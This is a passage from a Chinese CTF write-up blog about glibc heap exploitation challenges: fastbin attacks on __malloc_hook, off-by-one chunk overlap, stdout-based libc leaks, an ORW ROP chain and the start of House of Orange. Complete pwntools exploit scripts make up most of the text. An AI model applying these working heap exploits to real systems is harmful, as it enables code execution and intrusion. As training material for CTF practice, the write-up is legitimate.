class="line">    <span class="keyword">if</span> i == <span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    loc += <span class="number">1</span></span><br><span class="line">libcbase = u64((leak[:loc+<span class="number">1</span>])[loc-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4600</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xef6c4</span>, <span class="number">0xf0567</span>]</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">target = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__malloc_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x71</span>)+p64(target))   <span class="comment">#11        chunk overlapping修改fd</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;AAAA&#x27;</span>)      <span class="comment">#12</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(libcbase+one_gadget[<span class="number">2</span>]))  <span class="comment">#13</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Size :&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-V-N2020公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#0x02-V-N2020公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x02.[V &amp; N2020公开赛]simpleHeap (off by one + fastbin attack + one gadget)"></a>0x02.[V &amp; N2020公开赛]simpleHeap (off by one + fastbin attack + one gadget)</h3><p><code>checksec</code>看到保护全开</p>
<p>IDA打开，看到<code>edit</code>函数存在<code>off by one</code>漏洞</p>
<p>在<code>add</code>函数内看到题目限制了<code>size</code>的大小，但我们可以在分配后修改<code>size</code>，从而释放堆块进入<code>unsorted bin</code>，并且修改后还会造成对堆块重叠，重叠后我们可以直接<code>show</code>泄露出<code>libc</code>的地址，从而再次利用<code>fastbin attack</code>打<code>__malloc_hook</code>，但是在使用one_gadget的过程中我们发现都不能生效，这是因为one_gadget对当前栈环境有一定要求，对此，由于<code>__malloc_hook</code>和<code>__realloc_hook</code>的地址十分接近，在分配fake chunk的时候可以一并控制，因此我们可以先修改<code>__malloc_hook</code>为<code>__libc_realloc</code>函数地址，因为其在调用<code>__realloc_hook</code>之前会进行一系列压栈操作调整栈环境，从而有可能使得满足one_gadget条件。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先利用offbyone通过修改size使堆块进入unsorted bin内，泄露libc，然后fastbin attack用one_gadget打__malloc_hook即可成功getshell</span></span><br><span class="line"><span class="comment">#由于栈环境导致one_gadget不可用，因此需要修改__malloc_hook为realloc函数地址，并将__realloc_hook修改为one_gadget</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28798</span>)</span><br><span class="line">file = <span class="string">&#x27;./vn_pwn_simpleHeap&#x27;</span></span><br><span class="line"><span class="comment">#io = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#5        #避免合并</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)     <span class="comment">#chunk1 extend</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x91&#x27;</span>)     <span class="comment">#chunk2 extend</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)   <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)             <span class="comment">#泄露libc</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libcbase + libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">target = malloc_hook - <span class="number">35</span>             <span class="comment">#fastbin attack目标</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__malloc_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">b&#x27;\n&#x27;</span>)    <span class="comment">#恢复free-chunk2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#2    从free-chunk2中分割出chunk</span></span><br><span class="line">delete(<span class="number">2</span>)           <span class="comment">#进入fastbin</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(target)+<span class="string">b&#x27;\n&#x27;</span>)   <span class="comment">#修改fd</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;AAAA&#x27;</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>+p64(libcbase+one_gadget[<span class="number">1</span>])+p64(realloc+<span class="number">0x10</span>))   <span class="comment">#6</span></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-第三届美团网络安全高校挑战赛（初赛）-baby-focal-fastbin-attack-stdout-leak"><a href="#0x03-第三届美团网络安全高校挑战赛（初赛）-baby-focal-fastbin-attack-stdout-leak" class="headerlink" title="0x03.第三届美团网络安全高校挑战赛（初赛） - baby_focal ( fastbin attack + stdout leak )"></a>0x03.第三届美团网络安全高校挑战赛（初赛） - baby_focal ( fastbin attack + stdout leak )</h3><p><code>checksec</code>看到没开PIE，seccomp-tools看到禁用了execve，因此只能orw</p>
<p>IDA打开看到是一个常规的菜单题，有alloc，edit，delete选项，注意到alloc函数中有</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sizeinfo[<span class="number">2</span> * (<span class="type">int</span>)index] = nmemb + <span class="number">16</span>;</span><br></pre></td></tr></table></figure></div>

<p>即可溢出0x10大小，但因为程序中没有打印选项，因此选择打stdout泄露</p>
<p>则解题步骤如下：</p>
<ul>
<li>先填满tcache，然后释放到unsortedbin中，产生libc地址，同时利用溢出partial overwrite该chunk的fd位为stderr结构体内（可进行fastbin attack的位置），此时释放堆块进行fastbin attack，同时利用溢出partial overwrite一个chunk的fd位为进入unsorted bin 的chunk块。（由于partial overwrite时均需要爆破，则成功概率为1&#x2F;16*1&#x2F;16&#x3D;1&#x2F;256）</li>
<li>申请到stdout位置，修改结构体，使puts出libc地址。利用fastbin attack控制bss段的指针，获得任意地址写的能力。再修改指针为<code>__free_hook</code>，修改<code>__free_hook</code>为puts函数，获得任意地址读的能力。</li>
<li>这时程序基本已经任意由我们操控了。通过_environ变量获取到栈地址，随后直接在栈上写入rop链，直接orw读取flag</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./baby_focal&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_focal&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;exit\n&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index, size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>(<span class="params">io</span>):</span><br><span class="line">    attach(io,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">io</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input your name: &#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;./flag.txt\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#fastbin attack打IO_stdout泄露libc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0xd0</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">4</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">4</span>, <span class="number">0x68</span>)      <span class="comment">#防止与top chunk合并</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0xe1</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">3</span>)           <span class="comment">#3进入unsorted bin</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\x5d\x66\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\x40\xdd\n&#x27;</span>)        <span class="comment">#有1/16*1/16即1/256的几率当该chunk链入fastbin时且stderr位置正确</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#当爆破正确时,从fastbin中申请出stderr位置chunk</span></span><br><span class="line">    alloc(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x19</span>+<span class="string">b&#x27;\n&#x27;</span>)      <span class="comment">#修改stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#泄露libc</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ec980</span></span><br><span class="line">    log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">    __malloc_hook = libcbase+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    setcontext = libcbase+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">    log.success(<span class="string">&#x27;__malloc_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">    log.success(<span class="string">&#x27;setcontext ===&gt; &#x27;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line">    __free_hook = libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    environ = libcbase+libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    bss = <span class="number">0x404060</span></span><br><span class="line">    <span class="comment">#再次fastbin attack，打bss段上指针</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(bss-<span class="number">0x23</span>))</span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(__free_hook)+<span class="string">b&#x27;\n&#x27;</span>)       <span class="comment">#此时chunk1可进行任意写</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#泄露栈地址，方便rop</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(<span class="number">0x401134</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(environ)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x140</span></span><br><span class="line">    log.success(<span class="string">&#x27;stack ===&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    </span><br><span class="line">    flag = <span class="number">0x4040b0</span></span><br><span class="line">    pop_rdi = libcbase+<span class="number">0x23b6a</span></span><br><span class="line">    pop_rsi = libcbase+<span class="number">0x2601f</span></span><br><span class="line">    pop_rdx = libcbase+<span class="number">0x142c92</span></span><br><span class="line">    open_ = libcbase+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_ = libcbase+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    rop_chain = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(open_)\</span><br><span class="line">               +p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404100</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read_)\</span><br><span class="line">               +p64(pop_rdi)+p64(<span class="number">0x404100</span>)+p64(puts)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(stack)+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, rop_chain+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#DEBUG(io)</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./baby_focal&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn(io)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure></div>

<h2 id="task07"><a href="#task07" class="headerlink" title="task07"></a>task07</h2><h3 id="0x01-houseoforange-hitcon-2016-House-of-Orange-house-of-orange"><a href="#0x01-houseoforange-hitcon-2016-House-of-Orange-house-of-orange" class="headerlink" title="0x01.houseoforange_hitcon_2016 - House of Orange ( house of orange )"></a>0x01.houseoforange_hitcon_2016 - House of Orange ( house of orange )</h3><p>先checksec看到保护全开，IDA打开看到add最多4次，edit最多3次，再来看edit函数内部</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">len = input();</span><br><span class="line"><span class="keyword">if</span> ( len &gt; <span class="number">0x1000</span> )                           <span class="comment">// 未检查对应长度，存在堆溢出</span></span><br><span class="line">  len = <span class="number">4096</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">sub_C20(houseinfo[<span class="number">1</span>], len);</span><br></pre></td></tr></table></figure></div>

<p>此处未检查之前分配的大小，可以造成堆溢出</p>
<p>注意到程序中没有free函数，因此我们可以尝试利用堆溢出修改<code>top chunk</code>的size，再申请大堆块（大于top chunk的size），从而free掉<code>top chunk</code>，之后再申请就可以泄露出libc地址和堆地址</p>
<p>最后再对剩下的<code>top chunk</code>的bk位进行修改，执行<code>unsorted bin attack</code>，修改掉<code>_IO_list_all</code>位置的值，此时<code>_IO_list_all</code>就会指向<code>main_arena</code>区域，而修改后的<code>_IO_list_all</code>指向位置的结构体对应chain域恰好为0x60的smallbin对应的链表头。因此我们需要在之前修改<code>top chunk</code>的同时修改size位为0x60，这样在申请chunk之后它就会被放入0x60大小的smallbin中，从而伪造<code>_IO_FILE</code>结构和<code>vtable</code>表。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 